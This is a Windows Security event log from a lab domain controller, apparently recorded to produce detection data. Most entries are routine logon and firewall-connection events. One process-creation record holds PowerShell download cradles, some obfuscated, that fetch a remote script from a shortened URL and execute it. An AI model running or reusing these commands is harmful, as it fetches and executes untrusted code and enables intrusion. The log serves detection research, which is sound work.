EventCode=4634
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Logoff
OpCode=Info
RecordNumber=1382138
Keywords=Audit Success
Message=An account was logged off.

Subject:
	Security ID:		NT AUTHORITY\SYSTEM
	Account Name:		WIN-DC-974$
	Account Domain:		ATTACKRANGE
	Logon ID:		0x4FDB961

Logon Type:			3

This event is generated when a logon session is destroyed. It may be positively correlated with a logon event using the Logon ID value. Logon IDs are only unique between reboots on the same computer.
03/01/2021 10:53:30 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=4624
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Logon
OpCode=Info
RecordNumber=1382137
Keywords=Audit Success
Message=An account was successfully logged on.

Subject:
	Security ID:		NULL SID
	Account Name:		-
	Account Domain:		-
	Logon ID:		0x0

Logon Information:
	Logon Type:		3
	Restricted Admin Mode:	-
	Virtual Account:		No
	Elevated Token:		Yes

Impersonation Level:		Impersonation

New Logon:
	Security ID:		NT AUTHORITY\SYSTEM
	Account Name:		WIN-DC-974$
	Account Domain:		ATTACKRANGE.LOCAL
	Logon ID:		0x4FDB961
	Linked Logon ID:		0x0
	Network Account Name:	-
	Network Account Domain:	-
	Logon GUID:		{CC923A93-F001-0671-4717-F77291746201}

Process Information:
	Process ID:		0x0
	Process Name:		-

Network Information:
	Workstation Name:	-
	Source Network Address:	::1
	Source Port:		55119

Detailed Authentication Information:
	Logon Process:		Kerberos
	Authentication Package:	Kerberos
	Transited Services:	-
	Package Name (NTLM only):	-
	Key Length:		0

This event is generated when a logon session is created. It is generated on the computer that was accessed.

The subject fields indicate the account on the local system which requested the logon. This is most commonly a service such as the Server service, or a local process such as Winlogon.exe or Services.exe.

The logon type field indicates the kind of logon that occurred. The most common types are 2 (interactive) and 3 (network).

The New Logon fields indicate the account for whom the new logon was created, i.e. the account that was logged on.

The network fields indicate where a remote logon request originated. Workstation name is not always available and may be left blank in some cases.

The impersonation level field indicates the extent to which a process in the logon session can impersonate.

The authentication information fields provide detailed information about this specific logon request.
	- Logon GUID is a unique identifier that can be used to correlate this event with a KDC event.
	- Transited services indicate which intermediate services have participated in this logon request.
	- Package name indicates which sub-protocol was used among the NTLM protocols.
	- Key length indicates the length of the generated session key. This will be 0 if no session key was requested.
03/01/2021 10:53:30 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=4672
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Special Logon
OpCode=Info
RecordNumber=1382136
Keywords=Audit Success
Message=Special privileges assigned to new logon.

Subject:
	Security ID:		NT AUTHORITY\SYSTEM
	Account Name:		WIN-DC-974$
	Account Domain:		ATTACKRANGE
	Logon ID:		0x4FDB961

Privileges:		SeSecurityPrivilege
			SeBackupPrivilege
			SeRestorePrivilege
			SeTakeOwnershipPrivilege
			SeDebugPrivilege
			SeSystemEnvironmentPrivilege
			SeLoadDriverPrivilege
			SeImpersonatePrivilege
			SeDelegateSessionUserImpersonatePrivilege
			SeEnableDelegationPrivilege
03/01/2021 10:53:30 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5156
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382135
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a connection.

Application Information:
	Process ID:		852
	Application Name:	\device\harddiskvolume1\windows\system32\lsass.exe

Network Information:
	Direction:		Inbound
	Source Address:		::1
	Source Port:		55119
	Destination Address:	::1
	Destination Port:		389
	Protocol:		6

Filter Information:
	Filter Run-Time ID:	65786
	Layer Name:		Receive/Accept
	Layer Run-Time ID:	46
03/01/2021 10:53:30 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5156
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382134
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a connection.

Application Information:
	Process ID:		2684
	Application Name:	\device\harddiskvolume1\windows\adws\microsoft.activedirectory.webservices.exe

Network Information:
	Direction:		Outbound
	Source Address:		::1
	Source Port:		55119
	Destination Address:	::1
	Destination Port:		389
	Protocol:		6

Filter Information:
	Filter Run-Time ID:	65788
	Layer Name:		Connect
	Layer Run-Time ID:	50
03/01/2021 10:53:30 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5158
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382133
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a bind to a local port.

Application Information:
	Process ID:		2684
	Application Name:	\device\harddiskvolume1\windows\adws\microsoft.activedirectory.webservices.exe

Network Information:
	Source Address:		::
	Source Port:		55119
	Protocol:		6

Filter Information:
	Filter Run-Time ID:	0
	Layer Name:		Resource Assignment
	Layer Run-Time ID:	38
03/01/2021 10:53:30 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5156
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382132
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a connection.

Application Information:
	Process ID:		2272
	Application Name:	\device\harddiskvolume1\program files\splunkuniversalforwarder\etc\apps\splunk_ta_stream\windows_x86_64\bin\streamfwd.exe

Network Information:
	Direction:		Outbound
	Source Address:		10.0.1.14
	Source Port:		55118
	Destination Address:	10.0.1.12
	Destination Port:		8000
	Protocol:		6

Filter Information:
	Filter Run-Time ID:	69604
	Layer Name:		Connect
	Layer Run-Time ID:	48
03/01/2021 10:53:30 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5158
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382131
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a bind to a local port.

Application Information:
	Process ID:		2272
	Application Name:	\device\harddiskvolume1\program files\splunkuniversalforwarder\etc\apps\splunk_ta_stream\windows_x86_64\bin\streamfwd.exe

Network Information:
	Source Address:		0.0.0.0
	Source Port:		55118
	Protocol:		6

Filter Information:
	Filter Run-Time ID:	0
	Layer Name:		Resource Assignment
	Layer Run-Time ID:	36
03/01/2021 10:53:31 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5156
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382139
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a connection.

Application Information:
	Process ID:		2664
	Application Name:	\device\harddiskvolume1\windows\system32\dns.exe

Network Information:
	Direction:		Outbound
	Source Address:		10.0.1.14
	Source Port:		61566
	Destination Address:	10.0.0.2
	Destination Port:		53
	Protocol:		17

Filter Information:
	Filter Run-Time ID:	69604
	Layer Name:		Connect
	Layer Run-Time ID:	48
03/01/2021 10:53:33 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5156
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382161
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a connection.

Application Information:
	Process ID:		2664
	Application Name:	\device\harddiskvolume1\windows\system32\dns.exe

Network Information:
	Direction:		Outbound
	Source Address:		10.0.1.14
	Source Port:		60726
	Destination Address:	10.0.0.2
	Destination Port:		53
	Protocol:		17

Filter Information:
	Filter Run-Time ID:	69604
	Layer Name:		Connect
	Layer Run-Time ID:	48
03/01/2021 10:53:33 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5156
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382160
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a connection.

Application Information:
	Process ID:		2664
	Application Name:	\device\harddiskvolume1\windows\system32\dns.exe

Network Information:
	Direction:		Inbound
	Source Address:		::1
	Source Port:		55113
	Destination Address:	::1
	Destination Port:		53
	Protocol:		17

Filter Information:
	Filter Run-Time ID:	65786
	Layer Name:		Receive/Accept
	Layer Run-Time ID:	46
03/01/2021 10:53:33 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5156
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382159
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a connection.

Application Information:
	Process ID:		1316
	Application Name:	\device\harddiskvolume1\windows\system32\svchost.exe

Network Information:
	Direction:		Outbound
	Source Address:		::1
	Source Port:		55113
	Destination Address:	::1
	Destination Port:		53
	Protocol:		17

Filter Information:
	Filter Run-Time ID:	65788
	Layer Name:		Connect
	Layer Run-Time ID:	50
03/01/2021 10:53:33 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5158
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382158
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a bind to a local port.

Application Information:
	Process ID:		1316
	Application Name:	\device\harddiskvolume1\windows\system32\svchost.exe

Network Information:
	Source Address:		::
	Source Port:		55113
	Protocol:		17

Filter Information:
	Filter Run-Time ID:	0
	Layer Name:		Resource Assignment
	Layer Run-Time ID:	38
03/01/2021 10:53:33 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5158
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382157
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a bind to a local port.

Application Information:
	Process ID:		1316
	Application Name:	\device\harddiskvolume1\windows\system32\svchost.exe

Network Information:
	Source Address:		::
	Source Port:		55113
	Protocol:		17

Filter Information:
	Filter Run-Time ID:	0
	Layer Name:		Resource Assignment
	Layer Run-Time ID:	36
03/01/2021 10:53:33 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5156
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382156
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a connection.

Application Information:
	Process ID:		7076
	Application Name:	\device\harddiskvolume1\windows\system32\windowspowershell\v1.0\powershell.exe

Network Information:
	Direction:		Outbound
	Source Address:		10.0.1.14
	Source Port:		55122
	Destination Address:	104.23.99.190
	Destination Port:		443
	Protocol:		6

Filter Information:
	Filter Run-Time ID:	69604
	Layer Name:		Connect
	Layer Run-Time ID:	48
03/01/2021 10:53:33 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5158
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382155
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a bind to a local port.

Application Information:
	Process ID:		7076
	Application Name:	\device\harddiskvolume1\windows\system32\windowspowershell\v1.0\powershell.exe

Network Information:
	Source Address:		0.0.0.0
	Source Port:		55122
	Protocol:		6

Filter Information:
	Filter Run-Time ID:	0
	Layer Name:		Resource Assignment
	Layer Run-Time ID:	36
03/01/2021 10:53:33 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5156
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382154
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a connection.

Application Information:
	Process ID:		7076
	Application Name:	\device\harddiskvolume1\windows\system32\windowspowershell\v1.0\powershell.exe

Network Information:
	Direction:		Outbound
	Source Address:		10.0.1.14
	Source Port:		55121
	Destination Address:	104.23.99.190
	Destination Port:		80
	Protocol:		6

Filter Information:
	Filter Run-Time ID:	69604
	Layer Name:		Connect
	Layer Run-Time ID:	48
03/01/2021 10:53:33 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5158
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382153
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a bind to a local port.

Application Information:
	Process ID:		7076
	Application Name:	\device\harddiskvolume1\windows\system32\windowspowershell\v1.0\powershell.exe

Network Information:
	Source Address:		0.0.0.0
	Source Port:		55121
	Protocol:		6

Filter Information:
	Filter Run-Time ID:	0
	Layer Name:		Resource Assignment
	Layer Run-Time ID:	36
03/01/2021 10:53:33 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5156
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382152
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a connection.

Application Information:
	Process ID:		2664
	Application Name:	\device\harddiskvolume1\windows\system32\dns.exe

Network Information:
	Direction:		Outbound
	Source Address:		10.0.1.14
	Source Port:		60753
	Destination Address:	10.0.0.2
	Destination Port:		53
	Protocol:		17

Filter Information:
	Filter Run-Time ID:	69604
	Layer Name:		Connect
	Layer Run-Time ID:	48
03/01/2021 10:53:33 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5156
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382151
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a connection.

Application Information:
	Process ID:		1316
	Application Name:	\device\harddiskvolume1\windows\system32\svchost.exe

Network Information:
	Direction:		Outbound
	Source Address:		::1
	Source Port:		63816
	Destination Address:	::1
	Destination Port:		53
	Protocol:		17

Filter Information:
	Filter Run-Time ID:	65788
	Layer Name:		Connect
	Layer Run-Time ID:	50
03/01/2021 10:53:33 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5158
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382150
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a bind to a local port.

Application Information:
	Process ID:		1316
	Application Name:	\device\harddiskvolume1\windows\system32\svchost.exe

Network Information:
	Source Address:		::
	Source Port:		63816
	Protocol:		17

Filter Information:
	Filter Run-Time ID:	0
	Layer Name:		Resource Assignment
	Layer Run-Time ID:	38
03/01/2021 10:53:33 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5158
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382149
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a bind to a local port.

Application Information:
	Process ID:		1316
	Application Name:	\device\harddiskvolume1\windows\system32\svchost.exe

Network Information:
	Source Address:		::
	Source Port:		63816
	Protocol:		17

Filter Information:
	Filter Run-Time ID:	0
	Layer Name:		Resource Assignment
	Layer Run-Time ID:	36
03/01/2021 10:53:33 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5156
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382148
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a connection.

Application Information:
	Process ID:		7076
	Application Name:	\device\harddiskvolume1\windows\system32\windowspowershell\v1.0\powershell.exe

Network Information:
	Direction:		Outbound
	Source Address:		10.0.1.14
	Source Port:		55120
	Destination Address:	67.199.248.10
	Destination Port:		80
	Protocol:		6

Filter Information:
	Filter Run-Time ID:	69604
	Layer Name:		Connect
	Layer Run-Time ID:	48
03/01/2021 10:53:33 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5158
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382147
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a bind to a local port.

Application Information:
	Process ID:		7076
	Application Name:	\device\harddiskvolume1\windows\system32\windowspowershell\v1.0\powershell.exe

Network Information:
	Source Address:		0.0.0.0
	Source Port:		55120
	Protocol:		6

Filter Information:
	Filter Run-Time ID:	0
	Layer Name:		Resource Assignment
	Layer Run-Time ID:	36
03/01/2021 10:53:33 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5156
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382146
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a connection.

Application Information:
	Process ID:		2664
	Application Name:	\device\harddiskvolume1\windows\system32\dns.exe

Network Information:
	Direction:		Outbound
	Source Address:		10.0.1.14
	Source Port:		61645
	Destination Address:	10.0.0.2
	Destination Port:		53
	Protocol:		17

Filter Information:
	Filter Run-Time ID:	69604
	Layer Name:		Connect
	Layer Run-Time ID:	48
03/01/2021 10:53:33 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5156
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382145
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a connection.

Application Information:
	Process ID:		2664
	Application Name:	\device\harddiskvolume1\windows\system32\dns.exe

Network Information:
	Direction:		Inbound
	Source Address:		::1
	Source Port:		56809
	Destination Address:	::1
	Destination Port:		53
	Protocol:		17

Filter Information:
	Filter Run-Time ID:	65786
	Layer Name:		Receive/Accept
	Layer Run-Time ID:	46
03/01/2021 10:53:33 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5156
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382144
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a connection.

Application Information:
	Process ID:		1316
	Application Name:	\device\harddiskvolume1\windows\system32\svchost.exe

Network Information:
	Direction:		Outbound
	Source Address:		::1
	Source Port:		56809
	Destination Address:	::1
	Destination Port:		53
	Protocol:		17

Filter Information:
	Filter Run-Time ID:	65788
	Layer Name:		Connect
	Layer Run-Time ID:	50
03/01/2021 10:53:33 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5158
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382143
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a bind to a local port.

Application Information:
	Process ID:		1316
	Application Name:	\device\harddiskvolume1\windows\system32\svchost.exe

Network Information:
	Source Address:		::
	Source Port:		56809
	Protocol:		17

Filter Information:
	Filter Run-Time ID:	0
	Layer Name:		Resource Assignment
	Layer Run-Time ID:	38
03/01/2021 10:53:33 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5158
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382142
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a bind to a local port.

Application Information:
	Process ID:		1316
	Application Name:	\device\harddiskvolume1\windows\system32\svchost.exe

Network Information:
	Source Address:		::
	Source Port:		56809
	Protocol:		17

Filter Information:
	Filter Run-Time ID:	0
	Layer Name:		Resource Assignment
	Layer Run-Time ID:	36
03/01/2021 10:53:33 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=4688
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Process Creation
OpCode=Info
RecordNumber=1382141
Keywords=Audit Success
Message=A new process has been created.

Creator Subject:
	Security ID:		ATTACKRANGE\Administrator
	Account Name:		administrator
	Account Domain:		ATTACKRANGE
	Logon ID:		0x351DB1

Target Subject:
	Security ID:		NULL SID
	Account Name:		-
	Account Domain:		-
	Logon ID:		0x0

Process Information:
	New Process ID:		0x1ba4
	New Process Name:	C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
	Token Elevation Type:	%%1936
	Mandatory Label:		Mandatory Label\High Mandatory Level
	Creator Process ID:	0x1698
	Creator Process Name:	C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
	Process Command Line:	"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" & {(New-Object Net.WebClient).DownloadFile('http://bit.ly/L3g1tCrad1e','Default_File_Path.ps1');IEX((-Join([IO.File]::ReadAllBytes('Default_File_Path.ps1')|ForEach-Object{[Char]$_})))
(New-Object Net.WebClient).DownloadFile('http://bit.ly/L3g1tCrad1e','Default_File_Path.ps1');[ScriptBlock]::Create((-Join([IO.File]::ReadAllBytes('Default_File_Path.ps1')|ForEach-Object{[Char]$_}))).InvokeReturnAsIs()
Set-Variable HJ1 'http://bit.ly/L3g1tCrad1e';SI Variable:/0W 'Net.WebClient';Set-Item Variable:\gH 'Default_File_Path.ps1';ls _-*;Set-Variable igZ (.$ExecutionContext.InvokeCommand.(($ExecutionContext.InvokeCommand.PsObject.Methods|?{$_.Name-like'*Cm*t'}).Name).Invoke($ExecutionContext.InvokeCommand.(($ExecutionContext.InvokeCommand|GM|?{$_.Name-like'*om*e'}).Name).Invoke('*w-*ct',$TRUE,1))(Get-ChildItem Variable:0W).Value);Set-Variable J ((((Get-Variable igZ -ValueOn)|GM)|?{$_.Name-like'*w*i*le'}).Name);(Get-Variable igZ -ValueOn).((ChildItem Variable:J).Value).Invoke((Get-Item Variable:/HJ1).Value,(GV gH).Value);&( ''.IsNormalized.ToString()[13,15,48]-Join'')(-Join([Char[]](CAT -Enco 3 (GV gH).Value)))} 

Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.

Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.

Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.

Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator.
03/01/2021 10:53:33 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=4689
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Process Termination
OpCode=Info
RecordNumber=1382140
Keywords=Audit Success
Message=A process has exited.

Subject:
	Security ID:		ATTACKRANGE\Administrator
	Account Name:		administrator
	Account Domain:		ATTACKRANGE
	Logon ID:		0x351DB1

Process Information:
	Process ID:	0x1878
	Process Name:	C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
	Exit Status:	0x0
03/01/2021 10:53:34 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5156
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382172
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a connection.

Application Information:
	Process ID:		2664
	Application Name:	\device\harddiskvolume1\windows\system32\dns.exe

Network Information:
	Direction:		Inbound
	Source Address:		127.0.0.1
	Source Port:		55113
	Destination Address:	127.0.0.1
	Destination Port:		53
	Protocol:		17

Filter Information:
	Filter Run-Time ID:	65787
	Layer Name:		Receive/Accept
	Layer Run-Time ID:	44
03/01/2021 10:53:34 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5156
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382171
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a connection.

Application Information:
	Process ID:		1316
	Application Name:	\device\harddiskvolume1\windows\system32\svchost.exe

Network Information:
	Direction:		Outbound
	Source Address:		127.0.0.1
	Source Port:		55113
	Destination Address:	127.0.0.1
	Destination Port:		53
	Protocol:		17

Filter Information:
	Filter Run-Time ID:	65789
	Layer Name:		Connect
	Layer Run-Time ID:	48
03/01/2021 10:53:34 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5156
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382170
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a connection.

Application Information:
	Process ID:		2664
	Application Name:	\device\harddiskvolume1\windows\system32\dns.exe

Network Information:
	Direction:		Outbound
	Source Address:		10.0.1.14
	Source Port:		61644
	Destination Address:	10.0.0.2
	Destination Port:		53
	Protocol:		17

Filter Information:
	Filter Run-Time ID:	69604
	Layer Name:		Connect
	Layer Run-Time ID:	48
03/01/2021 10:53:34 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5156
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382169
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a connection.

Application Information:
	Process ID:		2664
	Application Name:	\device\harddiskvolume1\windows\system32\dns.exe

Network Information:
	Direction:		Outbound
	Source Address:		10.0.1.14
	Source Port:		61197
	Destination Address:	10.0.0.2
	Destination Port:		53
	Protocol:		17

Filter Information:
	Filter Run-Time ID:	69604
	Layer Name:		Connect
	Layer Run-Time ID:	48
03/01/2021 10:53:34 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5156
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382168
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a connection.

Application Information:
	Process ID:		2664
	Application Name:	\device\harddiskvolume1\windows\system32\dns.exe

Network Information:
	Direction:		Inbound
	Source Address:		::1
	Source Port:		56772
	Destination Address:	::1
	Destination Port:		53
	Protocol:		17

Filter Information:
	Filter Run-Time ID:	65786
	Layer Name:		Receive/Accept
	Layer Run-Time ID:	46
03/01/2021 10:53:34 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5156
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382167
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a connection.

Application Information:
	Process ID:		1316
	Application Name:	\device\harddiskvolume1\windows\system32\svchost.exe

Network Information:
	Direction:		Outbound
	Source Address:		::1
	Source Port:		63816
	Destination Address:	::1
	Destination Port:		53
	Protocol:		17

Filter Information:
	Filter Run-Time ID:	65788
	Layer Name:		Connect
	Layer Run-Time ID:	50
03/01/2021 10:53:34 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5156
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382166
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a connection.

Application Information:
	Process ID:		1316
	Application Name:	\device\harddiskvolume1\windows\system32\svchost.exe

Network Information:
	Direction:		Outbound
	Source Address:		::1
	Source Port:		56772
	Destination Address:	::1
	Destination Port:		53
	Protocol:		17

Filter Information:
	Filter Run-Time ID:	65788
	Layer Name:		Connect
	Layer Run-Time ID:	50
03/01/2021 10:53:34 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5158
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382165
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a bind to a local port.

Application Information:
	Process ID:		1316
	Application Name:	\device\harddiskvolume1\windows\system32\svchost.exe

Network Information:
	Source Address:		::
	Source Port:		63816
	Protocol:		17

Filter Information:
	Filter Run-Time ID:	0
	Layer Name:		Resource Assignment
	Layer Run-Time ID:	38
03/01/2021 10:53:34 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5158
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382164
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a bind to a local port.

Application Information:
	Process ID:		1316
	Application Name:	\device\harddiskvolume1\windows\system32\svchost.exe

Network Information:
	Source Address:		::
	Source Port:		56772
	Protocol:		17

Filter Information:
	Filter Run-Time ID:	0
	Layer Name:		Resource Assignment
	Layer Run-Time ID:	38
03/01/2021 10:53:34 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5158
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382163
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a bind to a local port.

Application Information:
	Process ID:		1316
	Application Name:	\device\harddiskvolume1\windows\system32\svchost.exe

Network Information:
	Source Address:		::
	Source Port:		56772
	Protocol:		17

Filter Information:
	Filter Run-Time ID:	0
	Layer Name:		Resource Assignment
	Layer Run-Time ID:	36
03/01/2021 10:53:34 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5158
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382162
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a bind to a local port.

Application Information:
	Process ID:		1316
	Application Name:	\device\harddiskvolume1\windows\system32\svchost.exe

Network Information:
	Source Address:		::
	Source Port:		63816
	Protocol:		17

Filter Information:
	Filter Run-Time ID:	0
	Layer Name:		Resource Assignment
	Layer Run-Time ID:	36
03/01/2021 10:53:35 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=4688
EventType=0
